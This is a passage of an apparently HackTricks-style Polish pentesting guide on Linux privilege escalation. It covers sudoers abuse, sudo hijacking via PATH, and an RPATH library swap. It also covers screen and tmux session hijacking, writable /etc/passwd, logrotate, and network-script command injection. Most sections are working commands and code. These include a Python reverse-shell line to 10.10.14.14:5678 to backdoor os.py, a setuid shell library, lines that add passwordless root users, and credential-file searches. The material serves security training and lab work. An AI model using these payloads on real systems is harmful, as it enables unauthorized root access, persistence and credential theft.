Plik `/etc/sudoers` i pliki w katalogu `/etc/sudoers.d` konfigurowują, kto może używać `sudo` i w jaki sposób. Te pliki **domyślnie mogą być czytane jedynie przez użytkownika root i grupę root**.\
**Jeżeli** możesz **odczytać** ten plik, możesz być w stanie **uzyskać pewne interesujące informacje**, a jeśli możesz **zapisć** dowolny plik, będziesz w stanie **eskalować uprawnienia**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Jeśli możesz zapisywać, możesz nadużyć tego uprawnienia.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Inny sposób nadużycia tych uprawnień:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Istnieją alternatywy dla binarki `sudo`, takie jak `doas` dla OpenBSD — pamiętaj, aby sprawdzić jego konfigurację w `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Jeśli wiesz, że **użytkownik zazwyczaj łączy się z maszyną i używa `sudo`** do eskalacji uprawnień i uzyskałeś shell w kontekście tego użytkownika, możesz **utworzyć nowy plik wykonywalny sudo**, który wykona twój kod jako root, a następnie polecenie użytkownika. Następnie **zmodyfikuj $PATH** w kontekście użytkownika (na przykład dodając nową ścieżkę w .bash_profile), aby gdy użytkownik uruchomi sudo, został wykonany twój plik sudo.

Zauważ, że jeśli użytkownik używa innej powłoki (nie bash), będziesz musiał zmodyfikować inne pliki, aby dodać nową ścieżkę. Na przykład[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) modyfikuje `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Możesz znaleźć inny przykład w [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Lub uruchamiając coś takiego:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Biblioteka współdzielona

### ld.so

Plik `/etc/ld.so.conf` wskazuje, **skąd pochodzą wczytywane pliki konfiguracyjne**. Zazwyczaj ten plik zawiera następującą ścieżkę: `include /etc/ld.so.conf.d/*.conf`

Oznacza to, że pliki konfiguracyjne z `/etc/ld.so.conf.d/*.conf` zostaną wczytane. Te pliki konfiguracyjne **wskazują na inne katalogi**, w których będą **wyszukiwane biblioteki**. Na przykład zawartość `/etc/ld.so.conf.d/libc.conf` to `/usr/local/lib`. **To oznacza, że system będzie szukał bibliotek wewnątrz `/usr/local/lib`**.

Jeśli z jakiegoś powodu **użytkownik ma uprawnienia do zapisu** na którejkolwiek z wskazanych ścieżek: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, dowolnym pliku wewnątrz `/etc/ld.so.conf.d/` lub dowolnym katalogu wymienionym w plikach konfiguracyjnych z `/etc/ld.so.conf.d/*.conf`, może udać mu się uzyskać wyższe uprawnienia.\
Sprawdź, **jak wykorzystać tę niewłaściwą konfigurację** na następującej stronie:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Kopiując bibliotekę do `/var/tmp/flag15/`, zostanie ona użyta przez program w tym miejscu, zgodnie z wartością zmiennej `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Następnie utwórz złośliwą bibliotekę w `/var/tmp` za pomocą `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Uprawnienia (Capabilities)

Linux capabilities zapewniają procesowi **podzbiór dostępnych uprawnień roota**. To skutecznie dzieli uprawnienia roota **na mniejsze i odrębne jednostki**. Każdej z tych jednostek można następnie niezależnie przydzielać procesom. W ten sposób pełny zestaw uprawnień zostaje zredukowany, zmniejszając ryzyko wykorzystania.\
Przeczytaj następującą stronę, aby **dowiedzieć się więcej o capabilities i jak je nadużywać**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Uprawnienia katalogów

W katalogu, **bit "execute"** oznacza, że dany użytkownik może **cd** do folderu.\
Bit **"read"** oznacza, że użytkownik może **listować** **pliki**, a bit **"write"** oznacza, że użytkownik może **usuwać** i **tworzyć** nowe **pliki**.

## ACLs

Access Control Lists (ACLs) stanowią drugą warstwę uprawnień dyskrecjonalnych, zdolną do **nadpisywania tradycyjnych uprawnień ugo/rwx**. Te uprawnienia zwiększają kontrolę nad dostępem do plików lub katalogów, pozwalając na przyznawanie lub odmawianie praw konkretnym użytkownikom, którzy nie są właścicielami ani członkami grupy. Ten poziom **szczegółowości zapewnia bardziej precyzyjne zarządzanie dostępem**. Więcej szczegółów można znaleźć [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Nadaj** użytkownikowi "kali" uprawnienia odczytu i zapisu do pliku:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Pobierz** pliki o określonych ACL z systemu:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
### Ukryty ACL backdoor w sudoers drop-ins

Częstym błędem konfiguracji jest plik należący do root w `/etc/sudoers.d/` o trybie `440`, który nadal przyznaje dostęp do zapisu użytkownikowi low-priv przez ACL.
```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```
Jeśli widzisz coś takiego jak `user:alice:rw-`, użytkownik może dodać regułę sudo pomimo restrykcyjnych bitów trybu:
```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```
To jest ścieżka ACL persistence/privesc o dużym wpływie, ponieważ łatwo ją przeoczyć podczas przeglądów ograniczonych tylko do `ls -l`.

## Otwarte sesje shell

W **starych wersjach** możesz **hijack** czyjąś **shell** sesję (innego użytkownika, np. **root**).\
W **nowszych wersjach** będziesz mógł **connect** tylko do screen sessions należących do **twojego użytkownika**. Jednak możesz znaleźć **interesujące informacje wewnątrz sesji**.

### screen sessions hijacking

**Wypisz screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```
![](<../../images/image (141).png>)

**Dołącz do sesji**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

To był problem ze **starymi wersjami tmux**.

Nie udało mi się przejąć sesji tmux (v2.1) utworzonej przez root jako nieuprzywilejowany użytkownik.

**Wyświetl sesje tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Dołącz do sesji**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Sprawdź **Valentine box from HTB** jako przykład.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Wszystkie klucze SSL i SSH wygenerowane w systemach opartych na Debianie (Ubuntu, Kubuntu, itp.) między wrześniem 2006 a 13 maja 2008 mogą być dotknięte tym błędem.\
Błąd ten występuje podczas tworzenia nowego ssh key w tych OS, ponieważ **tylko 32,768 wariantów było możliwych**. Oznacza to, że wszystkie możliwości można obliczyć i **mając ssh public key możesz wyszukać odpowiadający private key**. Obliczone możliwości znajdziesz tutaj: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH — interesujące wartości konfiguracji

- **PasswordAuthentication:** Określa, czy uwierzytelnianie hasłem jest dozwolone. Domyślnie `no`.
- **PubkeyAuthentication:** Określa, czy uwierzytelnianie za pomocą klucza publicznego jest dozwolone. Domyślnie `yes`.
- **PermitEmptyPasswords**: Gdy uwierzytelnianie hasłem jest dozwolone, określa, czy serwer pozwala na logowanie do kont z pustymi hasłami. Domyślnie `no`.

### Pliki kontrolujące logowanie

Te pliki wpływają na to, kto może się logować i w jaki sposób:

- **`/etc/nologin`**: jeśli istnieje, blokuje logowania innych niż root i wypisuje swoją wiadomość.
- **`/etc/securetty`**: ogranicza miejsca, z których root może się logować (lista dozwolonych TTY).
- **`/etc/motd`**: baner po logowaniu (can leak szczegóły środowiska lub konserwacji).

### PermitRootLogin

Określa, czy root może się logować przez ssh, domyślnie `no`. Możliwe wartości:

- `yes`: root może się zalogować używając hasła i private key
- `without-password` lub `prohibit-password`: root może logować się tylko za pomocą private key
- `forced-commands-only`: root może się zalogować tylko przy użyciu private key i jeśli określono opcję command
- `no`: brak

### AuthorizedKeysFile

Określa pliki, które zawierają klucze publiczne używane do uwierzytelniania użytkownika. Może zawierać tokeny takie jak `%h`, które zostaną zastąpione katalogiem domowym. **Można wskazać ścieżki bezwzględne** (rozpoczynające się od `/`) lub **ścieżki względne względem katalogu domowego użytkownika**. Na przykład:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Ta konfiguracja oznacza, że jeśli spróbujesz zalogować się za pomocą **private** klucza użytkownika "**testusername**", ssh porówna klucz publiczny Twojego klucza z tymi znajdującymi się w `/home/testusername/.ssh/authorized_keys` i `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding pozwala ci używać lokalnych kluczy SSH zamiast zostawiać klucze (bez passphrases!) na serwerze. Dzięki temu będziesz mógł połączyć się przez ssh z jednym hostem i stamtąd połączyć się na inny host, używając klucza znajdującego się na hoście początkowym.

Musisz ustawić tę opcję w `$HOME/.ssh.config` w następujący sposób:
```
Host example.com
ForwardAgent yes
```
Zauważ, że jeśli `Host` jest `*`, za każdym razem gdy użytkownik przełącza się na inną maszynę, ta maszyna będzie miała dostęp do kluczy (co stanowi problem bezpieczeństwa).

Plik `/etc/ssh_config` może **nadpisać** te **opcje** i zezwolić lub zabronić tej konfiguracji.\  
Plik `/etc/sshd_config` może **zezwolić** lub **zablokować** ssh-agent forwarding przy pomocy słowa kluczowego `AllowAgentForwarding` (domyślnie allow).

Jeśli stwierdzisz, że Forward Agent jest skonfigurowany w środowisku, przeczytaj następującą stronę, ponieważ **you may be able to abuse it to escalate privileges**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Interesujące pliki

### Pliki profili

Plik `/etc/profile` oraz pliki w katalogu `/etc/profile.d/` to **skrypty, które są wykonywane, gdy użytkownik uruchamia nową powłokę**. Zatem, jeśli możesz **zapisać lub zmodyfikować którykolwiek z nich, możesz escalate privileges**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Jeśli zostanie znaleziony jakiś podejrzany skrypt profilu, powinieneś sprawdzić go pod kątem **wrażliwych informacji**.

### Passwd/Shadow Files

W zależności od OS pliki `/etc/passwd` i `/etc/shadow` mogą mieć inną nazwę lub może istnieć kopia zapasowa. Dlatego zaleca się **znaleźć je wszystkie** i **sprawdzić, czy możesz je odczytać**, aby zobaczyć **czy w plikach znajdują się hashes**:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
W niektórych przypadkach można znaleźć **password hashes** w pliku `/etc/passwd` (lub równoważnym)
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Zapisywalny /etc/passwd

Najpierw wygeneruj hasło za pomocą jednego z następujących poleceń.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Dodaj użytkownika `hacker` i ustaw wygenerowane hasło: `f9G$2vQ!r7Zp8XwK`
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Np: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Możesz teraz użyć polecenia `su` z `hacker:hacker`

Alternatywnie, możesz użyć poniższych linii, aby dodać fałszywego użytkownika bez hasła.\
OSTRZEŻENIE: możesz osłabić aktualne bezpieczeństwo maszyny.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
UWAGA: Na platformach BSD plik `/etc/passwd` znajduje się w `/etc/pwd.db` i `/etc/master.passwd`, natomiast plik `/etc/shadow` został przemianowany na `/etc/spwd.db`.

Powinieneś sprawdzić, czy możesz **zapisywać do niektórych wrażliwych plików**. Na przykład, czy możesz zapisać do jakiegoś **pliku konfiguracyjnego usługi**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Na przykład, jeśli maszyna uruchamia serwer **tomcat** i możesz **zmodyfikować plik konfiguracji usługi Tomcat wewnątrz /etc/systemd/,** to możesz zmodyfikować linie:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Twój backdoor zostanie wykonany przy następnym uruchomieniu tomcat.

### Sprawdź foldery

Następujące foldery mogą zawierać kopie zapasowe lub interesujące informacje: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Prawdopodobnie nie będziesz w stanie odczytać ostatniego, ale spróbuj)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Nietypowa lokalizacja/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Zmodyfikowane pliki w ostatnich minutach
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Pliki Sqlite DB
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml pliki
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Ukryte pliki
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Skrypty/Binaria w PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Pliki webowe**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Kopie zapasowe**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Znane pliki zawierające hasła

Przejrzyj kod [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), wyszukuje on **kilka możliwych plików, które mogą zawierać hasła**.\
**Innym ciekawym narzędziem** którego możesz użyć do tego jest: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) które jest aplikacją open source służącą do odzyskiwania wielu haseł przechowywanych na lokalnym komputerze dla Windows, Linux & Mac.

### Logi

Jeśli potrafisz czytać logi, możesz znaleźć w nich **interesujące/poufne informacje**. Im dziwniejszy log, tym prawdopodobnie bardziej interesujący.\
Ponadto niektóre **"źle"** skonfigurowane (backdoored?) **audit logs** mogą pozwolić na **zarejestrowanie haseł** w audit logs, jak wyjaśniono w tym wpisie: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Aby móc czytać logi, grupa [**adm**](interesting-groups-linux-pe/index.html#adm-group) będzie bardzo pomocna.

### Pliki powłoki
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Powinieneś także sprawdzić pliki zawierające słowo "**password**" w **nazwie** lub w **treści**, a także sprawdzić IPs i emails w logach, lub hashes regexps.\
Nie będę tutaj wypisywał, jak to wszystko zrobić, ale jeśli jesteś zainteresowany możesz sprawdzić ostatnie checki, które wykonuje [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Pliki zapisywalne

### Python library hijacking

Jeśli wiesz **skąd** skrypt python będzie uruchamiany i **możesz zapisywać** w tym folderze lub możesz **modify python libraries**, możesz zmodyfikować OS library i backdoor it (jeśli możesz pisać tam, gdzie skrypt python będzie uruchamiany, skopiuj i wklej bibliotekę os.py library).

To **backdoor the library** just add at the end of the os.py library the following line (change IP and PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Eksploatacja logrotate

Podatność w `logrotate` pozwala użytkownikom z **uprawnieniami do zapisu** do pliku logu lub jego katalogów nadrzędnych potencjalnie uzyskać podniesione uprawnienia. Dzieje się tak, ponieważ `logrotate`, często uruchamiany jako **root**, można zmanipulować tak, aby wykonywał dowolne pliki, szczególnie w katalogach takich jak _**/etc/bash_completion.d/**_. Ważne jest sprawdzenie uprawnień nie tylko w _/var/log_, ale także w każdym katalogu, gdzie stosowana jest rotacja logów.

> [!TIP]
> Ta podatność dotyczy `logrotate` w wersji `3.18.0` i starszych

Bardziej szczegółowe informacje o podatności można znaleźć na tej stronie: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Możesz wykorzystać tę podatność za pomocą [**logrotten**](https://github.com/whotwagner/logrotten).

Ta podatność jest bardzo podobna do [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** więc zawsze, gdy odkryjesz, że możesz modyfikować logi, sprawdź, kto zarządza tymi logami i czy możesz eskalować uprawnienia, podstawiając logi jako symlinki.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Odniesienie do podatności:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Jeśli z jakiegoś powodu użytkownik jest w stanie **zapisać** skrypt `ifcf-<whatever>` do _/etc/sysconfig/network-scripts_ **lub** może **zmodyfikować** istniejący, to twój **system jest pwned**.

Skrypty sieciowe, np. _ifcg-eth0_, służą do połączeń sieciowych. Wyglądają dokładnie jak pliki .INI. Jednak są \~sourced\~ na Linuxie przez Network Manager (dispatcher.d).

W moim przypadku atrybut `NAME=` w tych skryptach sieciowych nie jest obsługiwany poprawnie. Jeśli w nazwie masz **białą/spację system próbuje wykonać część po tej białej/spacji**. To oznacza, że **wszystko po pierwszej spacji jest wykonywane jako root**.

For example: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Zwróć uwagę na pustą spację między Network a /bin/id_)

### **init, init.d, systemd i rc.d**

Katalog `/etc/init.d` zawiera **skrypty** dla System V init (SysVinit), **klasycznego systemu zarządzania usługami w Linux**. Zawiera skrypty do `start`, `stop`, `restart`, a czasem `reload` usług. Mogą być uruchamiane bezpośrednio lub przez dowiązania symboliczne znajdujące się w `/etc/rc?.d/`. Alternatywna ścieżka w systemach Redhat to `/etc/rc.d/init.d`.

Z kolei `/etc/init` jest powiązany z **Upstart**, nowszym **systemem zarządzania usługami** wprowadzonym przez Ubuntu, który używa plików konfiguracyjnych do zadań związanych z zarządzaniem usługami. Pomimo przejścia na Upstart, skrypty SysVinit są nadal wykorzystywane obok konfiguracji Upstart ze względu na warstwę kompatybilności w Upstart.

**systemd** wyłania się jako nowoczesny init i menedżer usług, oferując zaawansowane funkcje takie jak uruchamianie daemonów na żądanie, zarządzanie automountami oraz migawki stanu systemu. Organizuje pliki w `/usr/lib/systemd/` dla pakietów dystrybucji oraz w `/etc/systemd/system/` dla modyfikacji administratora, upraszczając administrację systemem.

## Inne triki

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks często podczepiają syscall, aby udostępnić uprzywilejowaną funkcjonalność jądra menedżerowi w userspace. Słaba autentykacja menedżera (np. kontrole podpisu oparte na FD-order lub słabe schematy haseł) może umożliwić lokalnej aplikacji podszycie się pod menedżera i eskalację do root na urządzeniach już zrootowanych. Dowiedz się więcej oraz szczegóły eksploatacji tutaj:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Discovery usług oparty na regexach w VMware Tools/Aria Operations może wyodrębnić ścieżkę do binarki z linii poleceń procesu i uruchomić ją z opcją -v w uprzywilejowanym kontekście. Permisywne wzorce (np. użycie \S) mogą dopasować nasłuchiwacze przygotowane przez atakującego w zapisywalnych lokalizacjach (np. /tmp/httpd), co prowadzi do wykonania jako root (CWE-426 Untrusted Search Path).

Dowiedz się więcej i zobacz uogólniony wzorzec zastosowalny w innych discovery/monitoring stackach tutaj:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Zabezpieczenia jądra

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Więcej pomocy

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Narzędzia Linux/Unix Privesc

### **Najlepsze narzędzie do wyszukiwania lokalnych wektorów eskalacji uprawnień na Linux:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t opcja)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumeruje luki w jądrze w Linux i macOS [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (dostęp fizyczny):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Zbiór dodatkowych skryptów**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Referencje

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
